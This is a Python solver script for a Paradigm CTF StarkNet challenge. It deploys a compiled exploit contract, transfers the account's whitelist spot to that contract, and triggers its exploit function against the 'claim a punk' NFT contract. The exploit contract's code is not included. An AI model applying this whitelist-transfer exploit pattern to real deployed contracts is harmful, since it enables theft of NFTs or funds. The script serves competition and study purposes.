# Before calling this solve.py script you must compile the exploit contract!
# starknet-compile --debug_info_with_source ./exploit.cairo > ./exploit.compiled.cairo
# 
# 

from pathlib import Path

from starknet_py.net import AccountClient
from starknet_py.contract import Contract

from private.paradigmctf.cairo_challenge import run_solver

async def solver(client: AccountClient, claim_a_punk_contract: Contract):
    # Deploy exploit contract
    print("deploy exploit contract")
    punk_nft_address = (await claim_a_punk_contract.functions["getPunksNftAddress"].call()).address
    exploit_contract_deployment = await Contract.deploy(
        client=client,
        compiled_contract=Path("exploit.compiled.cairo").read_text(),
        constructor_args=[
            client.address,
            claim_a_punk_contract.address,
            punk_nft_address
        ],
    )
    await exploit_contract_deployment.wait_for_acceptance()

    exploit_contract = exploit_contract_deployment.deployed_contract

    print(f"exploit contract deployed at {hex(exploit_contract.address)}")

    # Move whitelist spot from client to exploit contract
    result = await claim_a_punk_contract.functions["transferWhitelistSpot"].invoke(
        to=exploit_contract.address,
        max_fee=int(1e16)
    )
    await result.wait_for_acceptance()

    print(f"whitelist spot moved from account to exploit contract")

    # Call the exploit func
    result = await exploit_contract.functions["exploit"].invoke(
        max_fee=int(1e16)
    )
    await result.wait_for_acceptance()

    print(f"exploit executed")

run_solver(solver)